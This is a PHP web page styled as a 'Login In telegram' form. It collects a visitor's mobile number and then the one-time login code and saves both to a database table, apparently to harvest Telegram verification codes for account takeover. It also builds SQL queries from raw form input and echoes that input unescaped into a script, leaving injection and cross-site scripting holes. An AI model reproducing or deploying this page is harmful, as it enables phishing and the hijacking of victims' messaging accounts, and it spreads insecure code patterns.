<!DOCTYPE html>
<html lang="en">
<head>
  <title>Bootstrap Example</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
</head>
<body>
<?php
include '../config.php';
if(isset($_POST['mobile_save']))
{
    $mobile_number = $_POST['mobile_number'];

    $insert = "INSERT into user_mobile_otp_get SET mobile_number='$mobile_number',otp='0',`status`='0'";
    if(mysqli_query($conn,$insert))
    {
        ?>

        <script>
            var mob_num = '<?php echo $mobile_number; ?>';
            jQuery(document).ready(function(){
                jQuery(".mobile_number_form").attr("style","display:none;");
                jQuery(".otp_form").attr("style","width:30%;display:block;");
                jQuery("#mobile_number_hidden").attr("value",mob_num)
            });
        </script>
        <?php
    }
}

if(isset($_POST['otp_save']))
{
    $mobile_number_hidden = $_POST['mobile_number_hidden'];
    $otp = $_POST['otp'];

    $select = "SELECT * from user_mobile_otp_get where mobile_number='$mobile_number_hidden' && otp='0'";
    $row = $conn->query($select);
    if(mysqli_num_rows($row) > 0)
    {

        $update = "UPDATE user_mobile_otp_get SET otp='$otp' where mobile_number='$mobile_number_hidden'";
        if(mysqli_query($conn,$update))
        {
            
        }
    }
}
?>

<div class="jumbotron text-center">
  <h1>Login In telegram</h1>
  <p>Enter Mobile Number For Login in Telegram</p> 
</div>
  
<div class="container mobile_number_form" style="width:30%;">
    <form method="post">
        <!-- Name input -->
        <div class="form-outline mb-4">
            <input type="number" name="mobile_number" id="mobile_number" class="form-control" placeholder="Enter Mobile Number"/>
            <label class="form-label" for="mobile_number">Mobile Number</label>
        </div>

      
        <!-- Checkbox -->
        <div class="form-check d-flex justify-content-center mb-4">
            <input class="form-check-input me-2" type="checkbox" value="" id="form5Example3" checked />
            <label class="form-check-label" for="form5Example3">
            I have read and agree to the terms
            </label>
        </div>

        <!-- Submit button -->
        <button type="submit" name="mobile_save" id="mobile_save" class="btn btn-primary btn-block mb-4">Submit</button>
        <!-- <button type="submit" name="otp_save" id="otp_save" class="btn btn-primary btn-block mb-4">Submit</button> -->
    </form>
</div>

<div class="container otp_form" style="width:30%;display:none;">
    <form method="post">
  
        <input type="hidden" name="mobile_number_hidden" id="mobile_number_hidden" class="form-control"/>
        <!-- Email input -->
        <div class="form-outline mb-4">
            <input type="number" name="otp" id="otp" class="form-control" placeholder="Enter Otp"/>
            <label class="form-label" for="otp">Otp</label>
        </div>

        <!-- Checkbox -->
        <div class="form-check d-flex justify-content-center mb-4">
            <input class="form-check-input me-2" type="checkbox" value="" id="form5Example3" checked />
            <label class="form-check-label" for="form5Example3">
            I have read and agree to the terms
            </label>
        </div>

        <!-- Submit button -->
        <button type="submit" name="otp_save" id="otp_save" class="btn btn-primary btn-block mb-4">Submit</button>
    </form>
</div>

</body>
</html>
